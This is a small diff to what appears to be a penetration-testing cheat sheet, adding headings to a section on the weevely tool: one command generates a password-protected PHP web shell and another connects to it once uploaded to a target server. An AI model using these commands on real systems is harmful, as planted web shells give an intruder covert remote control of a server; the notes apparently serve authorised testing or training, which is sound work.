@@ -1,9 +1,14 @@
 
 ## weevely
+generate webshell
 ```
 weevely generate <password> shell.php
 ```
-once uploaded...
+
+> [!NOTE]
+> how to upload shell to server will vary
+
+run webshell
 ```
 weevely http://target/uploads/shell.php <password>
 ```
